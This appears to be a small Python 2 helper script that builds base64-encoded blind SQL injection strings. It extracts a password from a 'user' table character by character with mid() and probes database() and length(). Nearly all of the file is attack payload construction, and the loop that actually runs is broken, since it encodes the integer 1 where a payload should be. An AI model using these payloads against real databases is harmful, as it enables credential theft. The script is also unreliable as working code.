'''
Created on 2016-2-16

@author: wenhuizone
'''
import base64

list='0123456789abcdefghijklmnopqrstuvwxyz@'
a=''
#a="test' and mid((sElect password from user limit 1,1),1,1)='a' and '1"
'''
for i in list:
    a="test' and mid((sElect password from user limit 0,1),32,1)='"+i+"' and '1";
    print base64.b64encode(a)
'''

#1' and length(content)=1 -- -
#1' and mid(database(),1,1)=11 -- -

for i in list:
    #a="1' and length(database())="+str(i)+" -- -"
    a=1
    print base64.b64encode(a)
    